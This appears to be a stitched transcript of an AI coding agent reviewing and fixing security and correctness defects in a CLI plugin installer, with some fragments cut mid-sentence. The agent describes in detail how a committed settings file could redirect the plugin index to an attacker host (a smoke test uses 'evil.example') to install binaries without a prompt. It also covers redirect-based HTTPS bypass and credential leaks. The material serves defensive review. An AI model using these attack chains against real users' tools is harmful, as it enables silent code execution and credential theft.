`plugin_index.go:199-204`: `fresh = time.Since(info.ModTime()) < ttl` is negative-and-therefore-"fresh" when the marker is ahead of now (clock rollback, restored backup, bad container/NFS clock). With the marker set 400 days ahead and a new plugin published upstream, the second sync still returns the old catalog; only `plugin index update` recovers. Fix: `age := time.Since(mtime); fresh = age >= 0 && age < ttl`.

**14. `plugins.index_ttl_hours` overflows to a negative duration** — CONFIRMED
`settings/settings.go:207-212`; `Validate` (`:191`) only rejects `< 0`.
```
index_ttl_hours=2562047  -> 2562047h0m0s
index_ttl_hours=2562048  -> -2562047h34m33.7s   (negative → index ALWAYS stale)
index_ttl_hours=10000000 -> -248191h9m7.4s
index_ttl_hours=1<<62    -> 0s
Validate accepts index_ttl_hours=4611686018427387904
```
A user asking for "effectively never re-sync" gets "re-sync on every command". Fix: clamp hours in `Validate`, or saturate the multiply.

**15. A fixed `download_url` with no archive extension installs the archive as the binary and reports success** — CONFIRMED
`plugin_fetch.go:430-445` picks the format purely from the filename suffix; `assetNameFromURL` on `https://host/latest/download` yields `download` → default branch → raw copy.
```
install reported success: tag=v0.1.0 asset="download"
installed 'binary' first bytes: "\x1f\x8b\b\x00"   (gzip magic)
```
`binary_sha256` is then computed over the gzip bytes, so `plugin doctor` *confirms the corrupt install as intact*. `entire demo` dies with an exec-format error. Fix: sniff magic bytes (`\x1f\x8b`, `PK\x03\x04`) when the suffix is unrecognized.

---

## Lower severity

**16. Locale-fragile control flow for "metadata file absent"** — SPECULATIVE
`plugin_gitremote.go:183-192` decides the benign "no metadata" case by substring-matching git's **English** stderr (`does not exist`, `exists on disk, but not in`), and `gitQuiet` (`:27-31`) does not pin `LC_ALL`. Those strings are translated in git builds with NLS (Debian/Fedora ship `git.mo`). On a localized Linux host, every plugin repo *without* an `entire-plugin.yml` — the documented default — would fail to install. I could not reproduce: Apple Git 2.50.1 here ships no catalogs (verified: no `git.mo` on the box, message identical under `de_DE`/`fr_FR`/`ja_JP`). Cheap fix: `LC_ALL=C` in `gitQuiet`, or use `git cat-file -e <tag>:<path>` and branch on exit status.

**17. No timeout on any git subprocess** — read-confirmed
`pluginHTTPClient` bounds downloads at 5 min, but `gitQuiet` (`ls-remote`, up to two `clone`s *per tag*, index `fetch`) inherits only the command ctx. A black-holed git host hangs `entire plugin install` indefinitely. `GIT_TERMINAL_PROMPT=0` also doesn't stop **ssh** prompting for a key passphrase on `/dev/tty`, so an `ssh://` index blocks in CI. Consider per-operation `context.WithTimeout` + `GIT_SSH_COMMAND=ssh -oBatchMode=yes`.

**18. Partial dependency failure is opaque and leaves a mixed state** — CONFIRMED
`plugin_deps.go:249-257` aborts on the first failure; the "Installed dependency %q" lines print only after the whole plan succeeds (`plugin_group.go:298-303`).
```
ExecuteDepPlan err = install dependency "broken": release downloads need an http(s) repo URL, got ...
after partial failure: demo installed=true broken installed=false
```
The command exits non-zero (after already printing that the root plugin installed fine) and never tells the user that `demo` did land. Consider per-action progress output and continuing past a failed action.

**19. Concurrent installs of the same plugin are unserialized** — SPECULATIVE (did not reproduce in 12 attempts)
`SyncPluginIndex` takes a flock; `installRepoAtTag` takes none. Interleaving: P1 `replaceBinary` → P2 `replaceBinary` → P1 `fileSHA256(pkgBin)` reads P2's bytes → P1's manifest pairs its own tag with P2's digest, and `doctor` then reports "modified or replaced outside entire" for a benign race. `SavePluginManifest`'s non-atomic `os.WriteFile` has the same shape. A flock on `pkg/<name>` closes it.

**20. Smaller read-confirmed items**
- `sort.Slice` in `listRemoteSemverTags` is unstable, so semver-equal tags resolve arbitrarily: `[1.0.0 v1.0.0 v1.0.0+build7] -> tags[0]="1.0.0"`.
- `maxTagFallbacks` exhaustion names only the *last* tag tried, with no hint that just 3 tags were considered or that older tags exist.
- `httpGetSmall` (`plugin_fetch.go:355`) truncates `checksums.txt` at 1 MiB with a bare `io.LimitReader` — the exact invisible-truncation hazard `writeExecutableLimited` was hardened against. A large release loses lines (→ spurious "unverified") or gets a half-hex last line (→ spurious checksum mismatch).
- `normalizeRepoURL` (`plugin_index.go:112`) is case-sensitive and doesn't collapse `//`, so `https://GitHub.com/o/r` reads as "not in the index" and prompts on a legitimately listed repo.
- `extractFromTarGz`/`extractFromZip` take the *first* basename match: an archive with `docs/entire-x` before `bin/entire-x` installs the wrong file.
- `plugin upgrade <name> --all` silently ignores `--all` (`plugin_group.go:465-479`).
- `plugin upgrade` never re-plans dependencies, so a `requires` entry introduced by an upgrade is never installed (doctor-only).

content.text:
All six checks confirm the agents. Tree is clean.

## Bottom line

The panel found substantially more than the six review rounds before it. Three independent agents converged on the same central problem, and **two of the worst findings are in code I wrote today** — my HTTPS enforcement is bypassable and my URL validator contradicts the one already in the settings package. The "all checks green, no open findings" state I reported an hour ago was not a good proxy for risk.

## The central flaw: the trust root is attacker-choosable

Security and architecture agents hit this independently; the security agent confirmed it end-to-end by execution, and I verified the mechanism myself.

Two decisions compose into drive-by code execution:
- `plugins.index_url` is read from `.entire/settings.json` — the **committed** file, and the merge base at `settings.go:526`
- index-resolved installs set `trusted = true` and skip confirmation entirely (`plugin_group.go:182-193`)

So: clone any repo containing four lines of JSON, run `entire plugin install <any-name-in-their-catalog>`, and their binary is downloaded, chmod 0755, and linked into your managed bin dir — no prompt, no `--yes`, no warning. `plugin browse` does it on one keypress (I confirmed it calls `runRemoteInstall` directly at `plugin_group.go:658`). Their `official: true` badge renders as a trust signal from attacker-controlled data.

This is not something my fixes introduced — repo-level `plugins.index_url` was an advertised feature of the original PR. But it means the git-argument-injection hardening I did was defending the back door while the front door was open.

## My two regressions

| Finding | Status |
|---|---|
| **`requireSecureAssetURL` is bypassable via redirect.** `pluginHTTPClient` has no `CheckRedirect`; Go follows up to 10 redirects **across schemes** and the final URL is never re-validated. Both the asset and `checksums.txt` can arrive over plaintext — voiding my own doc comment verbatim. | I confirmed `CheckRedirect == nil`; agent confirmed the exploit by execution. One-line fix. |
| **My validator contradicts the existing one.** `validatePluginRepoURL` accepts `http://`, `git://`, and absolute paths; `PluginSettings.Validate` rejects all three. My comment claims it "mirrors" that allowlist. It does not. | Confirmed all three cases disagree. |

The second one matters beyond tidiness: `--index` and `ENTIRE_PLUGIN_INDEX_URL` bypass the settings validator, so the catalog that authorizes unprompted installs can be fetched over `git://` — no auth, no encryption — while I force HTTPS on the payload it authorizes.

## Correctness findings I verified myself

- **Prereleases rank as newest.** `v2.0.0-rc1` beats stable `v1.9.0`, so `plugin upgrade --all` migrates everyone onto release candidates the moment an author pushes one.
- **`darwin_all` doesn't exist.** `"all"` sits in the OS slot, generating `_all_arm64`; goreleaser puts it in the arch slot. The docs explicitly promise this fallback. macOS universal binaries can never install.
- **Empty `entire-plugin.yml` is fatal.** Empty or comment-only → `EOF` hard error at every tag, though metadata is documented as optional and a *missing* file is handled correctly.
- **`index_ttl_hours: 2562048` → negative duration**, i.e. always stale. `Validate` accepts it.

Plus, claimed-confirmed by agents and consistent with code I've read: **`plugin upgrade` can silently downgrade** and report "up to date"; **case-insensitive filesystems let installing plugin `Run` overwrite installed `run`** without `--force`; **the installed name comes from the remote**, so `install safe` can install `hijack`; **the cross-device copy path destroys the working binary on failure** (and is the *normal* path when `/tmp` is a separate filesystem); **credentialed URLs leak into `.entire/logs/` and `doctor bundle`**; and **`binary_sha256` is self-defeating** — the digest sits mode-0644 next to the binary, so anything that swaps one re-records the other.

## The concept verdict

The architecture agent's answer to "should this exist" is **ship reduced**, and its strongest argument is one I hadn't considered: this repo already ships Entire-owned external binaries through mise in two lines (`mise.toml:7-8`), including an `entire-agent-*` plugin, getting version resolution, a managed PATH dir, pinning and a lockfile for free. Against ~2,700 production lines for an ecosystem of one shipped plugin (`officialPlugins = ["ci"]`).

It recommends cutting `requires[]` (the motivating `entire-brain`/`entire-sem` example exists nowhere in the codebase; `min_version` is computed and never enforced; orphans leak forever), `browse`, `index_ttl_hours`, and `platforms`. It concedes the git-synced index is defensible — git buys auth inheritance for private catalogs, which a raw HTTPS GET wouldn't.

## What held up

Worth recording, since it's where the design is genuinely good: archive extraction was attacked hard and did not yield — symlink, hardlink, device, `../`, absolute, NUL and zip-slip entries all correctly refused, setuid mode not inherited. The `--upload-pack` injection fix holds against every payload tried, including `ext::`. No checksum-verification *bypass* was found — the fall-through I worried about correctly refuses. `classifyInstallArg` resisted local-file shadowing. The `limit+1` truncation fix works. Repo-convention compliance is strong.

## Where I'd go next

I don't think I should act on this unilaterally — it splits into three very different buckets:

1. **Cheap and unambiguous** (~half a day): `CheckRedirect`, one URL validator, drop `http://`/`git://`, prereleases, `darwin_all`, empty-YAML, TTL clamp, `O_NOFOLLOW`, strip URL userinfo, git timeouts, and the integration-test hermeticity gap. All defects with no design question attached.
2. **The trust model** — index URL out of committed settings, and/or prompt on non-default indexes. This changes an advertised feature and is Thomas's call.
3. **The cuts** — removing `requires[]` and `browse` is a scope decision on someone else's PR that I shouldn't make.

My recommendation: let me do bucket 1 now, and take buckets 2 and 3 to Thomas with the reports. Fixing hermeticity first matters, because until then the four integration tests guarding the trust model would pass even if index resolution silently fell back to the real network.

One caveat on the panel itself: the architecture agent initially credited test hygiene and then retracted part of it after auditing — so its confidence isn't uniform, and I'd treat its *cut* recommendations as arguments to weigh rather than conclusions. The security and correctness findings I've spot-verified held up every time I checked.

Want me to start on bucket 1?

Harden the plugin supply chain: transport, naming, hygiene fixes

Defect fixes from an adversarial review. Each was verified against the code
before changing it; the trust-model and scope questions the review also raised
are deliberately not touched here.

Integration-test hermeticity, first so the rest can be believed. The plugin
integration tests built their child env from os.Environ() instead of
testutil.GitIsolatedEnv(), and GitIsolatedEnv is the only thing that makes the
process-wide ENTIRE_TEST_GIT_HERMETIC=1 bite — it writes the per-host
http.<url>.proxy entries that route github.com/gitlab.com at a dead loopback
address. Flag set, tripwire absent, real global git config inherited. So if
index-URL resolution had regressed to the built-in default, all four tests
would have cloned the real entireio/plugin-index and passed. cmd.Dir was also
unset, leaving the child standing in the real repo reading its committed
.entire/settings.json.

HTTPS enforcement was bypassable by redirect. pluginHTTPClient had no
CheckRedirect, and Go's default policy follows up to ten hops across schemes
while only the initial URL was ever checked — so an https:// entry point could
deliver the asset and its checksums.txt over plaintext, the exact outcome
requireSecureAssetURL was written to prevent. Every hop is now re-validated;
same-transport redirects (CDN hops) still work.

One URL validator, narrowed. validatePluginRepoURL and
PluginSettings.Validate disagreed about http://, git:// and bare absolute
paths, so `--index /srv/idx` was accepted while the equivalent committed
setting was a hard load failure — and the comment claimed to mirror an
allowlist it contradicted. Both now call settings.ValidateGitURL. http:// and
git:// are dropped: they are unauthenticated and unencrypted, and the catalog
fetched over them decides what installs without a prompt, so rewriting the
transport chooses the binary. Bare absolute paths are dropped in favor of
file://, which is unambiguous.

Prereleases are no longer resolved as newest. semver ranks v2.0.0-rc1 above
stable v1.9.0, so `plugin upgrade --all` moved every user onto a release
candidate as soon as an author pushed one. --pin bypasses listing and is the
opt-in. Tag sorting is now stable so semver-equal spellings resolve
deterministically.

macOS universal binaries could never install. "all" sat in the OS slot,
generating _all_<arch>, a spelling no forge produces; goreleaser puts it in the
arch slot as darwin_all — the fallback the docs already promised.

Binary writes are atomic and do not follow symlinks. writeExecutable opened the
destination with O_CREATE|O_TRUNC and no O_EXCL, so a symlink planted at
pkg/<name>/entire-<name> redirected the write anywhere the user can write, and
O_TRUNC destroyed a working binary before the new bytes were known good — on
the cross-device path, which is the normal one when /tmp is a separate
filesystem. Now a sibling temp file plus rename.

Credentials no longer reach logs, output, or disk. Userinfo is stripped from
every repo/index URL before printing, logging, or persisting, and git's stderr
is scrubbed for the same pattern. .entire/logs/ lives in the working tree and
is collected wholesale by `doctor bundle`; manifest.yml is mode 0644.

Bounded git subprocesses. The root context is cancellable but has no deadline,
so an unreachable host hung the command indefinitely with no output — worst
during dependency planning, which fans out to author-controlled URLs before any
confirmation. Two minutes per invocation, matching the download cap's intent.
LC_ALL=C in the same env, because the "no metadata file" branch substring-matches
git's English stderr and NLS builds translate it; ssh BatchMode so a key
passphrase prompt cannot block CI.

Empty entire-plugin.yml is no longer fatal. An empty or comment-only file
decodes to io.EOF; the file is documented as optional and a missing one is
handled, so a committed placeholder must not abort every install. Explicit
"---" already behaved this way.

index_ttl_hours is bounded. Past ~2.5M hours the nanosecond conversion wrapped
negative, i.e. always stale — the opposite of the large value requested.
Validate rejects out-of-range, IndexTTL saturates. A sync marker dated in the
future no longer reads as fresh forever (clock rollback, restored backup).

Bucket 1 is done and pushed. All GitHub checks pass; only the human-approval gate is outstanding.

## What landed (`9c5cf27e5`)

| Fix | Why it mattered |
|---|---|
| **Integration-test hermeticity** — done first | Tests built child env from `os.Environ()`, so `ENTIRE_TEST_GIT_HERMETIC=1` was set with no config backing it. A regression to the default index would have cloned the real `entireio/plugin-index` and *passed*. `cmd.Dir` was also unset, leaving the child reading the real repo's committed settings. |
| **Redirect re-validation** | Go follows up to 10 hops across schemes; only the entry URL was checked. My HTTPS rule was bypassable by any open redirect. Now every hop is checked; same-transport CDN hops still work. |
| **One URL validator, narrowed** | The two validators disagreed on `http://`, `git://`, and absolute paths — `--index /srv/idx` worked while the same committed setting was a hard failure. Both now call `settings.ValidateGitURL`; `http://`/`git://` dropped. |
| **Prereleases excluded** | `v2.0.0-rc1` outranked stable `v1.9.0`, so `upgrade --all` moved everyone onto release candidates. Plus stable sort for semver-equal tags. |
| **`darwin_all`** | `all` was in the OS slot generating `_all_arm64`; universal macOS releases could never install despite the docs promising the fallback. |

Both confirmed, and one is significant: `.entire/settings.local.json` **is** gitignored (via `.entire/.gitignore`), which makes the per-user fix option viable. And the new trail finding is the *same* root cause the security and correctness agents each found independently — the remote-declared name is never reconciled. That's now three independent discoveries of one defect.

Here's the brief for Thomas.

---

## Context to give him first

Ten commits were added to his branch: a merge with main (2053 commits), fixes for 13 bot findings' worth of follow-on issues, four trail findings, and a tranche of defects from a three-agent adversarial review. Two of those commits change default behavior — checksums now required for install, and `http://`/`git://` no longer accepted for repo or index URLs. All CI is green.

A calibration note worth passing on: the review panel was deliberately adversarial, one agent retracted part of its own assessment mid-flight, and an earlier finding had a conclusion that turned out to be wrong. Everything below I spot-verified myself. But the *cut* recommendations are arguments to weigh, not verdicts.

## Bucket 2 — the trust model

**The chain.** Three existing decisions compose into remote code execution:

1. `plugins.index_url` is read from `.entire/settings.json` — the **committed** file, and the base of the settings merge (`settings.go:526`)
2. A bare-name install resolves through that index and sets `trusted = true` (`plugin_group.go:182`)
3. `trusted` skips the confirmation prompt entirely (`plugin_group.go:193`)

So: someone publishes a repo containing four lines of JSON. A victim clones it and runs `entire plugin install <any-name-in-their-catalog>` from inside it. The attacker's binary is downloaded, `chmod 0755`, and linked into the user's managed `bin/` — which is on `PATH` for every future `entire` invocation. No prompt, no `--yes`, no warning. `entire plugin browse` does it on one keypress.

**Precision on what it requires:** cloning alone isn't enough — the victim must run a plugin install from within the repo. That's a real bar, but not much of one for a tool whose README headline example is `entire plugin install upgrade`.

**Why it's worth his attention specifically:** the PR already treats index entries as attacker-influenced — that's the stated reason for the `--upload-pack` hardening in `external-commands.md`. The same document then keeps "index-listed ⇒ no prompt." The hardening defends the back door; this is the front one. It also makes the `official: true` badge a trust signal rendered from attacker-controlled data.

**Four ways out, with what each costs:**

| Option | Effect | Cost |
|---|---|---|
| **A.** Accept `index_url` only from `settings.local.json` / `--index` / env | Closes it completely. `settings.local.json` is gitignored, so it's genuinely per-user. | Kills the "a company commits an internal catalog" feature as designed — contributors would each opt in manually. |
| **B.** Keep repo-level, but prompt once per never-before-seen index URL and remember the answer per-user | Preserves the feature; turns a silent redirect into one informed decision. Trust-on-first-use, same shape as SSH host keys. | New per-user trust state to store. |
| **C.** Repo-level index may drive discovery (`search`/`info`), but installs from a non-default index always confirm | Keeps catalog browsing frictionless, gates only the dangerous verb. | Two classes of index, slightly more to explain. |
| **D.** Always print the effective index URL and require `--yes` when it isn't the built-in default | Cheapest. | Relies on the user reading a line they'll learn to skip. |

**My recommendation: B.** It's the only one that keeps the internal-catalog feature — which is clearly deliberate design, not an accident — while making the redirect visible exactly once. A is the safe fallback if he'd rather not add trust state.

Worth noting the sub-question separately: *is "index-listed ⇒ no prompt" itself wrong?* I don't think so. For a curated index the user chose, no-prompt is good UX. The problem is purely **who chose the index**. Fix provenance and the no-prompt rule becomes defensible again — which is why I'd frame this to him as a provenance bug, not an argument for more prompting.

## Bucket 3 — the cuts

**`requires[]` (dependencies) — the strongest case, ~430 production + ~405 test lines.**

Evidence: the motivating example (`entire-brain` needs `entire-sem`) exists nowhere in the codebase — only in the PR body and one docs line. `min_version` is computed, including a diamond-constraint resolver I fixed, but never enforced on the *outcome*: `ExecuteDepPlan` installs the newest tag, so if newest < minimum the install reports success and `doctor` nags forever. Orphans leak permanently — there's no `auto_installed` marker, so `install brain` pulls `sem` and `remove brain` leaves it behind with doctor silent. Planning does one `ls-remote` plus one-to-two shallow clones **per dependency** against author-controlled URLs, before any confirmation. And it's the one path that could hang unbounded (now fixed with a timeout).

Most telling: **four of the review findings landed in `plugin_deps.go`, across four separate rounds** — including the one that arrived while I was writing this. The subsystem keeps generating defects.

The counter he'll reasonably raise: plugins may grow real dependencies later, and re-adding is harder than keeping. That counter is weaker than it looks for a specific reason — see the next item.

**`browse` — cut.** No capability over `search` + `install`, requires a TTY, installs with no confirmation, over a catalog with three entries.

**`index_ttl_hours` — cut, hardcode 24h.** `plugin index update` already forces a refresh and stale-on-offline already covers the failure mode, so the knob tunes a problem solved twice. It also costs two settings loads per sync. (It had an overflow bug — fixed — but the knob is still unearned.)

**`platforms` in `index.json` — cut.** Warning-only; the install proceeds regardless. And it lives in the catalog rather than with the author, so it drifts and then warns about a working plugin.

## The item that isn't a cut but has a deadline

**`entire-plugin.yml` uses strict decoding** (`plugin_manifest.go:119`, `dec.KnownFields(true)`), which is the exact inverse of the decision we made for `index.json` in the same PR — where the reasoning is that an artifact read by every shipped CLI must degrade rather than refuse.

`entire-plugin.yml` is that same class of artifact, and it has no `version` field to gate on. So the first plugin author who adds any new field — `min_cli_version`, `bin_name`, anything — breaks installs on every older CLI, permanently, for everyone. The author can't fix that for existing users.

The benefit is catching author typos, which is real but badly asymmetric: a typo is caught once by the author testing their own plugin; a forward-compat break is unfixable and fleet-wide. The better split is lenient parsing plus an `entire plugin lint` for authors.

**This is cheap and it expires.** Once third-party `entire-plugin.yml` files exist in the wild, older CLIs stay broken forever. It's also the reason the "keep `requires[]` for later" counter is weak — if `requires[]` is cut and re-added, authors adopting it would break older CLIs unless decoding is lenient first.

## The concept-level question, stated fairly

The architecture agent's verdict was **ship reduced**, and its sharpest argument deserves to reach him intact: this repo already ships Entire-owned external binaries through mise in two lines (`mise.toml:7-8`) — including an `entire-agent-*` plugin — getting version resolution, a managed PATH dir, pinning and a lockfile for free. Against ~2,700 production lines for an ecosystem of one shipped plugin (`officialPlugins = ["ci"]`).

The honest counter, which the agent conceded: mise's `go:` backend needs a Go toolchain, Homebrew needs a tap plus a formula per plugin and skips Windows, `go install` needs Go, krew is kubectl-only. A non-developer on Windows is genuinely underserved by all of them, and `entire plugin install <git-url>` is a real new capability. So "just use mise" isn't free — but the floor isn't nothing either; it's `plugin install <url>` plus a documented mise line.

## What held up under attack

Important that this doesn't read as a hatchet job — several things were attacked hard and didn't yield:

- **Archive extraction is solid.** Symlink, hardlink, device, `../`, absolute-path, NUL and zip-slip entries all correctly refused; setuid mode not inherited. The `Typeflag != tar.TypeReg` filter plus a single fixed destination make zip-slip structurally unreachable.
- **The `--upload-pack` fix holds** against every payload tried, including `ext::`.
- **No checksum-verification bypass exists** — the manifest fall-through correctly refuses rather than silently downgrading.
- **`classifyInstallArg` resisted** local-file shadowing.
- **`bin/` as sole dispatch surface** with `plugin.go` untouched, and reusing `InstallPluginFromPath` for linking, was praised as the right layering.
- **The `index.json` version-recorded-not-enforced decision** survived a deliberate attempt to argue for enforcement.

## Also worth telling him: the top remaining defect

Not in either bucket, but three independent reviewers found it, so it should be on his list. **The installed plugin name comes from the remote, not from what the user asked for** (`plugin_install_remote.go:97-102`). `entire plugin install safe` can install `hijack`. Consequences: name-squatting via an index entry with no prompt; `--force` scope escalation, since the already-installed guard tests the *remote-declared* name; and for dependencies, the install "succeeds" while `dependencySatisfied` keeps looking for the requested name — so it's re-attempted on every future parent install and doctor reports it missing forever.

content.text:
Yes — that's exactly the precedence, and it's `--index` > `ENTIRE_PLUGIN_INDEX_URL` > `settings.local.json` > `settings.json` > built-in default.

**Your proposal is better than the trust-on-first-use option I recommended.** Three reasons:

**It's a deletion, not an addition.** My Option B needed new per-user trust state — where to store it, how to prune it, what the prompt says, what happens non-interactively. Yours removes code. And it composes with the bucket-3 recommendation to cut `index_ttl_hours`: if both go, the entire `PluginSettings` struct disappears — the field on `EntireSettings`, `mergePlugins`, `Validate`, `IndexTTL`, `PluginIndexURL`, `PluginIndexTTL`, and a 162-line test file. It also eliminates the `settings.go` merge-conflict surface, which was one of the two conflicts with main.

**It fails safe.** With a settings override, a misconfiguration or a hostile repo means you silently use *someone else's* catalog. Without it, the worst case is you use *ours*. For a default, that's the right direction.

**It drops two settings loads per sync.** `resolvePluginIndexURL` wouldn't need to touch settings at all — a cost the architecture review flagged separately.

## The one thing you lose, stated honestly

The feature and the vulnerability are the same mechanism. The value of committed `index_url` is that a contributor who clones the repo gets a different catalog **without knowing**. That's the vulnerability described as a feature. You can't keep one and drop the other — you can only choose whether the redirect is *visible* (my Option B) or *impossible* (yours).

For the internal-catalog use case, `ENTIRE_PLUGIN_INDEX_URL` in a shell profile or onboarding doc still works, and works across all repos rather than per-repo — arguably better for a company-wide catalog.

There's a useful precedent here that's worth putting in the Thomas message: **Go has no repo-committed way to redirect `GOPROXY`** — it's env or user-level `go env -w`. **npm does allow a per-project `.npmrc` with `registry=`, and it's a well-known supply-chain footgun.** The stricter choice has better company.

## One variant worth knowing about

You could allow `settings.local.json` (gitignored, so not attacker-controlled) while rejecting the committed `settings.json`. That gives a dev a persistent per-repo override without the drive-by.

I'd skip it. The settings package doesn't currently thread file provenance through the merge, so it's real work, and the env var already covers persistence. Only worth it if someone specifically wants per-repo-but-not-committed.

## My recommendation

Drop `plugins.index_url` entirely, keep `--index` and the env var, and cut `index_ttl_hours` at the same time so the whole struct goes. That resolves bucket 2 and one of the four bucket-3 cuts in a single change, and it's strictly less code than the branch has today.

Two caveats before I touch it: it removes an explicitly advertised feature from Thomas's PR, and `entire-plugin.yml`'s strict decoding is the other item with a real deadline — it should probably go in the same pass, since it's cheap and expires once third-party plugins exist.

s=open(p).read()
anchor="#### Credentials never reach logs, output, or disk"
add="""#### `entire-plugin.yml` decodes leniently

Unknown keys are ignored, the same choice made for `index.json` and for the same reason: both are artifacts read by every CLI version ever shipped, and refusing one an older binary doesn't fully understand breaks it permanently for everyone on that version, with no way for the plugin author to fix it for them. `entire-plugin.yml` has no `version` field to gate on either, so the first author to adopt any future field would break installs on every older CLI.

This gives up catching author typos, which strict decoding did. The trade is asymmetric: a misspelled key costs the author one confused test run against their own plugin; a forward-compatibility break is unfixable and fleet-wide. Author-side validation belongs in a lint command, not in the path every user's install runs through.

An empty or comment-only file is also accepted — the file is documented as optional, and a committed placeholder should not be fatal at every tag.

"""

open(p,"w").write(s)

plugins.index_url was read from .entire/settings.json — a committed file
resolved from the working directory — while an index-listed repository installs

lines of JSON and running `entire plugin install <any-name-in-their-catalog>`

keypress.

The setting cannot be kept and made safe. Its whole value was that contributors
got a different catalog *without knowing* — that is the vulnerability stated as
a feature. The options were to make the redirect visible (prompt per unseen
index) or impossible; this takes the second, because it deletes code instead of
adding trust state, and because it fails safe: a missing override now falls back
to the curated default rather than to someone else's catalog.

Organizations wanting an internal catalog set ENTIRE_PLUGIN_INDEX_URL, which
applies across repositories rather than per-repository and cannot be chosen by
content the user merely checked out. Go takes the same position — nothing
committed can redirect GOPROXY — and npm's per-project registry override is the
cautionary counter-example.

plugins.index_ttl_hours goes with it: `plugin index update` already forces a
refresh and stale-on-offline already covers a failed one, so the knob tuned a
problem solved twice while costing a settings load per sync. The TTL is now a
fixed 24h constant.

its tests are gone — 320 lines, and the plugin layer now reads no settings at
all, so resolvePluginIndexURL no longer needs a context. The URL validator moves
back to the cli package as the single definition, which is where its only

All 11 GitHub checks pass. Entire Gates is still running its fresh agent review.

## Done — `600eae5c6` and `9c1de62dd`

**1. Index URL out of repo-committed settings**

`plugins.index_url` and `plugins.index_ttl_hours` are gone, and with them the whole `PluginSettings` struct, its validator, its merge path, and its 162-line test file — **320 lines deleted**. The plugin layer now reads no settings at all, so `resolvePluginIndexURL` doesn't even need a context. The URL validator moved back into `cli` as the single definition, since that's where its only remaining callers live.

Net effect on the settings package versus main: **+39 lines** (a deprecated field and one test), down from +320. The `settings.go` merge-conflict surface with main is effectively gone.

Verified by smoke test — a repo committing `{"plugins":{"index_url":"https://evil.example/idx"}}` now gets the real curated index:

```
$ entire plugin search        # run from inside that repo
  run       Launch one of the agents enabled for Entire...
  upgrade   Upgrade the system-installed Entire binary [official]
```

**2. Lenient `entire-plugin.yml` decoding** — the deadline-sensitive one. The test now pins that a file carrying an unknown field still parses *and* keeps its known fields, so a future `min_cli_version` can't break older CLIs.

## One thing I found and handled that you should know about

Removing the settings keys made a leftover `plugins` key **hard-fail the strict loader**, which broke `entire status` — not just plugin commands — with an opaque `unknown field "plugins"`. Anyone who tried the feature during development would hit that, plausibly including Thomas, since the PR body says he validated against production.

I followed the repo's existing precedent (the deprecated `Strategy` key) and kept a tolerated, ignored `Plugins map[string]any` field. Confirmed end-to-end:

```
$ entire status               # with a leftover plugins key
● Enabled · branch main
```

This is the one piece of the change I made a judgment call on without asking — it's three lines, it matches an established pattern, and the alternative was shipping a change that bricks an unrelated command for early adopters.

## What this means for the Thomas brief

Bucket 2 is now resolved in code rather than described, and one of the four bucket-3 cuts came along with it. Worth updating the message you copied: instead of "here's a vulnerability and four fix options," it's now "here's the fix, 320 lines net deletion, CI green" — with the design question for him being whether he accepts losing committed internal catalogs in favor of `ENTIRE_PLUGIN_INDEX_URL`.

Still open from bucket 3: `requires[]` (the big one), `browse`, and `platforms`. Those are genuine scope decisions on his PR, and I'd leave them to him.

And still open, unrelated to either bucket: the name-reconciliation defect at `plugin_deps.go:251` — the installed plugin name comes from the remote rather than what was requested. Three independent reviewers found it and it's the only open trail finding. It's a real bug rather than a design question, so if you want it fixed I can take it; it just wasn't in the buckets we scoped.

Beyond "it's unmerged," the argument I'd actually put in the commit: tolerate-and-ignore was worse for the one case that mattered. The removed setting existed so a company could commit an internal catalog — silently ignoring it would leave such a repo on the *public* index while its authors believed otherwise. `unknown field "plugins"` forces the migration to `ENTIRE_PLUGIN_INDEX_URL` to be noticed. And my `Strategy` precedent was weaker than I made it sound: that field tolerates config that actually shipped.

## The High finding — my own bug

Entire Gates flagged a credential leak at `plugin_fetch.go`, and it was legitimate: my earlier commit said *"Credentials no longer reach logs, output, or disk"* and that was **false**. I covered the four git paths and missed the HTTP one.

`releaseAssetBaseURL` derives the asset URL from the repo URL, and `url.String()` re-serializes embedded userinfo — so `REDACTED` yields a credentialed download URL, which thirteen error paths then interpolated verbatim. `main.go` prints command errors straight to stderr, so any ordinary failure — unreachable host, 5xx, checksum mismatch, oversize — printed the token to a terminal or CI log.

Fixed in `ba64c9c5f`, with a regression test across five failure modes, verified RED first:

```
case 0 leaked the credential: download REDACTED
  : Get "REDACTED" : dial tcp: no such host
```

That output is worth a second look — Go had **already** masked its own nested error to `bob:***@host`. The leak was entirely our wrapper around it. Which is why the test asserts on the full error string rather than trusting the transport layer to sanitize, and why I'd distrust any similar claim elsewhere in the codebase that hasn't been tested this way.

```
Trail #973 — High finding resolved
```

Two things outstanding, both genuine decisions rather than defects:

- **`plugin_deps.go:251`** — still the one open finding: the installed plugin name comes from the remote rather than what was requested, so a dependency can install under a different name and be reported missing forever. Found by three independent reviewers now. It's a real bug, not a design question — say the word and I'll fix it.
- **Bucket 3 remainder** — `requires[]`, `browse`, `platforms`. Thomas's scope calls.

For the brief you copied: bucket 2 is now resolved in code, not described. The framing shifts from "here's a vulnerability and four options" to "here's the fix, 320 lines net deletion, settings package back to identical-with-main" — with the one question for Thomas being whether he accepts losing committed internal catalogs in favor of the env var.

content.text:
Fixed and pushed as `161a73b30`. `mise run test:ci` green, lint 0 issues, and the trail finding is resolved.

## What the fix does

`RemoteInstallOptions.ExpectedName` carries the name the caller already committed to, and a mismatch is fatal. Three callers set it:

| Path | Expected name | Why it has one |
|---|---|---|
| Index-resolved install | the catalog entry | The user typed that name, and index installs never prompt |
| Dependency install | the requirement's name | The user confirmed a plan naming it |
| Upgrade | the installed plugin's name | It's reinstalling something already named |

A bare `install <url>` sets nothing — there the repository legitimately names itself, and that's an existing documented feature (the end-to-end test already covers metadata naming a plugin its repo basename couldn't).

It **fails** rather than warns, because every caller that sets an expectation has already made a trust decision about *that specific name*; silently honoring a different one voids it. A genuine rename is a catalog entry or requirement to fix, and the error says so.

This closes all three forms the reviewers found: the dependency-installs-under-wrong-name loop (reported by the trail), index name-squatting, and `--force` escalating across plugins because the already-installed check tested the remote-declared name.

I also finished the credential redaction across the remaining user-visible URL output — the dependency plan listing, the uninspectable-dependency warning, doctor's reinstall suggestions, and `plugin info`. Manifest URLs are already stripped at write time, but redacting on the way out too means no caller has to reason about which sources are pre-sanitized.

## Bucket 3 — what's left

Three items, all scope decisions on Thomas's PR rather than defects. None of them is broken; the argument is that each costs more than it earns.

**1. `requires[]` — the dependency system. ~430 production + ~405 test lines.**

This is the substantial one. The case for cutting:

- The motivating example (`entire-brain` needs `entire-sem`) exists nowhere in the codebase — only in the PR body and one docs line.
